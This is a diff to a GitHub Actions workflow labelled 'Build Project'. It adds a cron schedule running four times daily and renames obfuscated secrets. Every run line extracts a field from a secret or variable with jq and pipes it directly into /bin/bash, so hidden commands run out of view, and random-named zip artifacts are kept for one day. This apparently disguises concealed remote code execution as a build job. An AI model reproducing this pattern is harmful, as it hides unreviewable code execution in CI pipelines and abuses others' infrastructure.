@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '42 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -15,20 +17,18 @@ jobs:
         uses: actions/checkout@v4
       - name: Go
         env:
-          knq0: ${{ secrets.knq0 }}
+          wsrxr7186: ${{ secrets.wsrxr7186 }}
         run: |
-          printf '%s' "$knq0" | jq -r .kg8827 | /bin/bash
-          printf '%s' "$xcl9" | jq -r .g9481 | /bin/bash
-          echo $xol045 | jq -r .fdzrn7942 | /bin/bash
-          echo $uy5778 | jq -r .gctz06 | /bin/bash
-          echo $uy400 | jq -r .t4897 | /bin/bash
-          echo $x9 | jq -r .qaziw918 | /bin/bash
-          printf '%s' "$xn8" | jq -r .oofih23314 | /bin/bash
+          printf '%s' "$wsrxr7186" | jq -r .bcw6561 | /bin/bash
+          echo $f08024 | jq -r .k9546 | /bin/bash
+          printf '%s' "$tjkr395" | jq -r .celx050 | /bin/bash
+          echo $wtakp59679 | jq -r .l82 | /bin/bash
+          echo $xp462 | jq -r .jx034 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: VQgPJ40I
+          name: DoNO4OXL
           path: "*.zip"
           retention-days: 1
